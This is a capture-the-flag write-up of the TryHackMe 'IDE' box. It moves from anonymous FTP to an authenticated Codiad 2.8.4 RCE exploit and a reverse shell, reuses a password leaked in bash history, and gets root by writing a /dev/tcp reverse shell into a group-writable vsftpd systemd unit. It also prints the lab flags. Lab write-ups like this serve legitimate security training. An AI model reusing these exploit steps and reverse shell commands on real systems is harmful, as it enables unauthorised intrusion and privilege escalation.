# TryHackMe - IDE

Time to root this box called "IDE" — the name's already telling us there's some kind of web-based IDE waiting for us. Let's get into it!

## Recon

Kicking things off with a full port nmap scan:

```
$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.48.146.232

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
```

Four ports open. Port 80 is just the default Apache page, nothing there. But port 62337 is running **Codiad 2.8.4** — that's our IDE. And FTP is showing anonymous login allowed too, so let's check that first.

## Anonymous FTP Loot

```
$ ftp 10.48.146.232
Name: Anonymous
230 Login successful.

ftp> ls -al
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ...

ftp> cd ...
ftp> ls -al
-rw-r--r--    1 0        0             151 Jun 18  2021 -

ftp> more -
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

Sneaky hidden directory named `...` with a note from "drac" to "john". So we've got a username (john) and a hint that the password is some kind of default password. Also a hint about "the image file" — filing that away for later.

## Codiad Login

Headed to `http://10.48.146.232:62337` and tried logging in as **john** with a guessed default password.

Logged straight in. Codiad 2.8.4 confirmed.

## Exploiting Codiad — CVE-2018-14009

Codiad 2.8.4 is known to be vulnerable to an authenticated RCE. Let's check searchsploit:

```
$ searchsploit codiad
Codiad 2.8.4 - Remote Code Execution (Authenticated)     | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2) | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3) | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4) | multiple/webapps/50474.txt

$ searchsploit -m 49705
Codes: CVE-2018-14009
```

Grabbed 49705.py. This one abuses the filemanager's search functionality — it passes an unsanitized `search_file_type` parameter straight into a shell command via `escapeshellarg`, so command injection lands us a reverse shell.

Set up listeners and fired it off:

```
$ python 49705.py http://10.48.146.232:62337/ john password 192.168.141.17 4444 linux
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

Caught the shell on the second listener:

```
$ nc -nvlp 4445
connect to [192.168.141.17] from (UNKNOWN) [10.48.146.232] 37080
www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
www-data
```

Anddd we're in as www-data!

## Enumeration as www-data

Checking `/home` for user accounts:

```
www-data@ide:/home$ ls
drac

www-data@ide:/home/drac$ ls -al
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
```

Bash history is world-readable, and it's got something juicy:

```
www-data@ide:/home/drac$ cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

A leftover MySQL password sitting right there in the history. Worth trying it as drac's login password too since people reuse creds all the time.

## SSH as drac

```
$ ssh drac@10.48.146.232
drac@10.48.146.232's password: 
Welcome to Ubuntu 18.04.5 LTS

drac@ide:~$ cat user.txt
02930d21a8eb009f6d26361b2d24a466
```

**USER FLAG: 02930d21a8eb009f6d26361b2d24a466**

The mysql password from bash_history worked as drac's SSH password too. Nice.

## Privesc to root

Checking sudo rights straight away:

```
drac@ide:~$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=...

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

We can restart the vsftpd service as root with no password. That service file itself is writable by our group:

```
drac@ide:~$ ls -la /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

`root drac` ownership with group-write — so we can edit the unit file directly and stuff a reverse shell into `ExecStartPre`, which runs as root before the service even starts:

```
drac@ide:~$ echo -e "Description=vsftpd FTP server \nAfter=network.target \n[Service] \nType=simple \nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf \nExecReload=/bin/kill -HUP $MAINPID \nExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/192.168.141.17/1337 0>&1' \n[Install] \nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service

drac@ide:~$ systemctl daemon-reload
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```

Caught the shell on the listener:

```
$ nc -nvlp 1337
connect to [192.168.141.17] from (UNKNOWN) [10.48.146.232] 60328
root@ide:/# whoami
root
```

Anddd we're root!

```
root@ide:/root# cat root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

**ROOT FLAG: ce258cb16f47f1c66f0b0b77f4e0fb8d**

Thanks for reading!
